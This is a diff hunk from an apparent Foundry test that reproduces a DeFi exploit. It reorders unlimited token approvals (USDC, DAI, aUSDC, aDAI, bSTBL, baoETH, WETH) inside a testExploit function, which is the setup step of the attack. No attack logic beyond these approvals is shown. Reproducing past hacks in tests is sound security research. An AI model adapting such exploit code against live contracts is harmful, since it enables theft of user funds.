@@ -69,14 +69,14 @@ contract ContractTest is Test {
     }
 
     function testExploit() external {
+        // FiatToken.approve(address(USDC), type(uint256).max);
+        // AToken1.approve(address(aUSDC), type(uint256).max);
+        // AToken2.approve(address(aDAI), type(uint256).max);
+        // Facet.approve(address(bSTBL), type(uint256).max);
         USDC.approve(address(AaveV2), type(uint256).max);
-        FiatToken.approve(address(USDC), type(uint256).max);
-        AToken1.approve(address(aUSDC), type(uint256).max);
-        AToken2.approve(address(aDAI), type(uint256).max);
         DAI.approve(address(AaveV2), type(uint256).max);
         aUSDC.approve(address(bSTBL), type(uint256).max);
         aDAI.approve(address(bSTBL), type(uint256).max);
-        Facet.approve(address(bSTBL), type(uint256).max);
         bSTBL.approve(address(bdbSTBL), type(uint256).max);
         baoETH.approve(address(Balancer), type(uint256).max);
         WETH.approve(address(Router), type(uint256).max);
